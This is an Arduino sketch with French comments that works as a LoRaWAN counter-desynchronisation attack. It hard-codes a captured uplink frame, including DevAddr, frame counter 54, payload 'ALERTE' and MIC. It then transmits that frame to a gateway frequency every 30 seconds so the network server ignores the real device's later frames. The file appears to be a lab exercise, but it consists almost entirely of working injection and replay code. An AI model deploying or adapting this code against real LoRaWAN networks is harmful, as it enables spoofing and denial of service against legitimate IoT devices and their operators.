#include <SPI.h>
#include <LoRa.h>

// ===== CONFIGURATION =====
const float FREQ_GATEWAY = 868.1;    // Canal LoRaWAN (ex: 868.1 MHz)
const int SF = 7;                    // Doit correspondre au LoPy4
const long BW = 125E3;
const int SYNC_WORD = 0x34;          // LoRaWAN Public

// ===== DONNÉES CAPTURÉES =====
// Trame LoRaWAN avec FCnt = 54 et MIC converti en Hexa
uint8_t attackPacket[] = { 
  0x40,                   // MHDR (Unconfirmed Data Up)
  0x5D, 0xBC, 0x4D, 0x00, // DevAddr: 004dbc5d (Inversé en Little Endian)
  0x00,                   // FCtrl
  0x36, 0x00,             // FCnt: 54 (0x36 en hexa, format 16 bits Little Endian)
  0x02,                   // FPort (Port 2)
  // --- Payload EXACT de la capture ---
  0x41, 0x4C, 0x45, 0x52, 0x54, 0x45, // 6. FRMPayload: "ALERTE" (414c45525445)
  // --- MIC converti ---
  0xFB, 0x86, 0x53, 0xD4  // MIC final : 251, 134, 83, 212
};
void setup() {
  Serial.begin(115200);
  while (!Serial);

  Serial.println("--- ATTAQUANT COUNTER DESYNC ---");

  // Initialisation sur la fréquence de la Gateway
  if (!LoRa.begin(FREQ_GATEWAY * 1E6)) {
    Serial.println("Erreur LoRa");
    while (1);
  }

  LoRa.setSpreadingFactor(SF);
  LoRa.setSignalBandwidth(BW);
  LoRa.setSyncWord(SYNC_WORD);
  LoRa.disableInvertIQ(); // Mode Uplink (Node vers Gateway)

  Serial.println("Prêt pour l'injection");
}

void loop() {
  // L'attaque se fait par injection directe
  injecterFauxCompteur();

  Serial.println("Attente avant nouvelle injection (30s)");
  delay(30000); 
}

void injecterFauxCompteur() {
  Serial.println("Envoi du paquet avec FCnt=54 vers la Gateway");

  LoRa.beginPacket();
  LoRa.write(attackPacket, sizeof(attackPacket));
  LoRa.endPacket();

  Serial.println(">>> Injection réussie ! Le serveur attend maintenant FCnt > 54.");
}
